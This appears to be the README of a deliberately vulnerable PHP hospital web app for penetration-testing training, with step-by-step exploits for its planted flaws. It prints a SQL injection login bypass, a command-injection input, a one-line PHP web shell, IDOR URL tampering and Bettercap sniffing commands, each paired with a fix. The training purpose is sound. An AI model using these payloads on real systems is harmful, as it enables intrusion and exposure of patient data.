### **🛡️ Vulnerable Hospital Web Application (HackMe Hospital)**
📌 **Educational Web Application for Penetration Testing & Security Research**  

This project is a **deliberately vulnerable hospital management system** designed for **penetration testing training and security research**. It contains **multiple web vulnerabilities** that security testers can exploit to understand real-world attack vectors.  

**⚠️ Disclaimer:**  
🔴 **This project is for ethical hacking and security research only.**  
🔴 **Do not deploy on production servers or use for unauthorized activities.**  
🔴 **Use in a controlled, isolated testing environment.**  

---

## **🩺 About HackMe Hospital**
HackMe Hospital is a **web-based medical portal** allowing patients to:  
✅ **Book appointments**  
✅ **Order medication**  
✅ **View their medical records**  
✅ **Change account settings**  

However, the system is **intentionally insecure** and contains the following **critical vulnerabilities**:

| **Vulnerability** | **Description** |
|------------------|----------------|
| **SQL Injection (SQLi)** | Poorly sanitized user input allows attackers to manipulate database queries. |
| **Command Injection** | Unsanitized user input allows execution of system commands on the server. |
| **File Upload Vulnerability** | No validation on uploaded files, allowing execution of malicious PHP scripts. |
| **Insecure Direct Object Reference (IDOR)** | Users can view other patients' records by modifying URL parameters. |
| **Information Disclosure** | Errors and misconfigurations reveal sensitive database details and file paths. |
| **ARP Spoofing & Password Sniffing** | Credentials are stored in plaintext, making them vulnerable to network attacks. |

---

## **💻 Setting Up the Web Application Locally**
### **🔹 Prerequisites**
- **XAMPP (Apache + MySQL + PHP)**
- **A local or virtual machine running Windows/Linux**
- **A browser (Chrome, Firefox, etc.)**
- **Kali Linux (Optional - For Exploitation)**

### **🔹 Installation Instructions**
1️⃣ **Install XAMPP** (If not already installed):  
   - Download and install XAMPP from [Apache Friends](https://www.apachefriends.org/download.html).  
   - Ensure Apache and MySQL are **running** from the XAMPP control panel.

2️⃣ **Clone the Repository**:
   ```bash
   git clone https://github.com/minaramez/Vulnerable-Hospital-Web-Application.git
   cd Vulnerable-Hospital-Web-Application
   ```

3️⃣ **Move Project Files to XAMPP htdocs Directory**:
   ```bash
   mv hackme-hospital /xampp/htdocs/hackme-hospital
   ```

4️⃣ **Setup the Database**:
   - Open **phpMyAdmin** at `http://localhost/phpmyadmin/`
   - Create a new database named **hackme**
   - Import `hackme.sql` into the database

5️⃣ **Run the Web Application**:
   - Open your browser and go to:
     ```
     http://localhost/hackme-hospital/
     ```
   - Login with **default credentials**:
     ```
     Username: admin
     Password: admin123
     ```

---

## **🔍 How to Exploit Vulnerabilities**
This section provides **step-by-step guides** on exploiting each vulnerability.

### **1️⃣ SQL Injection (SQLi)**
💥 **Vulnerability**: The login page (`loginpage.php`) does not properly sanitize user input, allowing SQL injection attacks.  
💡 **Exploitation Steps**:
1. Navigate to `http://localhost/hackme-hospital/loginpage.php`
2. Enter the following payload in the **username field**:
   ```
   ' OR '1'='1' -- 
   ```
3. Leave the password blank and submit the form.
4. You will be **logged in as an administrator** without valid credentials.

**🛠 Fix**: Use **prepared statements** in PHP to prevent SQLi.

---

### **2️⃣ Command Injection**
💥 **Vulnerability**: Some **PHP scripts execute system commands** based on user input.  
💡 **Exploitation Steps**:
1. Navigate to `book_appointment.php`
2. In the **Appointment Notes field**, enter:
   ```
   ; whoami
   ```
3. Submit the form and observe the server response. The **current user** of the server should be displayed.

**🛠 Fix**: Use **escapeshellarg()** or **parameterized queries** to filter input.

---

### **3️⃣ File Upload Vulnerability**  
💥 **Vulnerability**: The **file upload function** (`order_medication.php`) does not restrict file types, allowing **PHP scripts to be uploaded and executed**.  

💡 **Exploitation Steps**:  
1. Use the **attached file (`malicious.php`)**, or create your own PHP web shell:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
2. Save it as `shell.php` (if creating your own).
3. Navigate to `http://localhost/hackme-hospital/order_medication.php`.
4. Upload `malicious.php` (or `shell.php`).
5. Access the shell via:
   ```
   http://localhost/hackme-hospital/uploads/malicious.php?cmd=whoami
   ```

**🛠 Fix**: Restrict file uploads to **safe extensions (e.g., .jpg, .png, .pdf)** and disable PHP execution in the uploads folder.

---

### **4️⃣ Insecure Direct Object Reference (IDOR)**
💥 **Vulnerability**: **Medical records are accessed via predictable URLs**, allowing unauthorized access.  
💡 **Exploitation Steps**:
1. Log in as a **regular user**.
2. Navigate to your medical records:
   ```
   http://localhost/hackme-hospital/view_records.php?patient_id=1
   ```
3. Change the `patient_id` in the URL:
   ```
   http://localhost/hackme-hospital/view_records.php?patient_id=2
   ```
4. You will now see **another patient's records**.

**🛠 Fix**: Implement **access control checks** to ensure users can only access their own records.

---

### **5️⃣ Information Disclosure**
💥 **Vulnerability**: Improper error handling reveals **database queries, file paths, and sensitive server details**.  
💡 **Exploitation Steps**:
1. Enter an **invalid SQL query** in the login field:
   ```
   ' OR 1=1#
   ```
2. If the server displays an error message, it may **reveal the database structure**.

**🛠 Fix**: Disable error reporting in **production environments** and handle exceptions properly.

---

### **6️⃣ ARP Spoofing & Password Sniffing**
💥 **Vulnerability**: **Credentials are stored in plaintext**, making them vulnerable to **MITM (Man-in-the-Middle) attacks**.  
💡 **Exploitation Steps** (Using Kali Linux):
1. Run **Bettercap** to spoof ARP requests:
   ```bash
   bettercap -iface eth0
   ```
2. Start the **sniffer** to capture login credentials:
   ```bash
   net.sniff on
   ```
3. When a user logs in, their **plaintext credentials** will appear in your terminal.

**🛠 Fix**: Always **encrypt passwords** using `bcrypt()` and enforce **HTTPS**.

---

### License
This script is released under the **MIT License**, which allows modification, distribution, and use with minimal restrictions.
